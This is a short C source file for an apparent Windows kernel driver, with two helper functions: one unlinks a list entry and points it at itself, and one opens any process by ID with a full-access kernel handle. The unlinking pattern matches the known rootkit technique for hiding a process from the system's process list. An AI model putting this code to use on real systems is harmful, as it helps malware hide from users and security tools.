#include "helper.h"
void remove_links(PLIST_ENTRY Current) {
	PLIST_ENTRY Previous, Next;
	Previous = (Current->Blink);
	Next = (Current->Flink);
	Previous->Flink = Next;
	Next->Blink = Previous;
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;
}
NTSTATUS OpenProcess(PHANDLE hProc, ULONG ProcId) {
	OBJECT_ATTRIBUTES procAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(0, OBJ_KERNEL_HANDLE);
	NTSTATUS stat = STATUS_UNSUCCESSFUL;
	CLIENT_ID pid;
	pid.UniqueProcess = UlongToHandle(ProcId);

	if (NT_SUCCESS(ZwOpenProcess(hProc, PROCESS_ALL_ACCESS, &procAttributes, &pid))) {
		stat = STATUS_SUCCESS;
	}
	return stat;
}
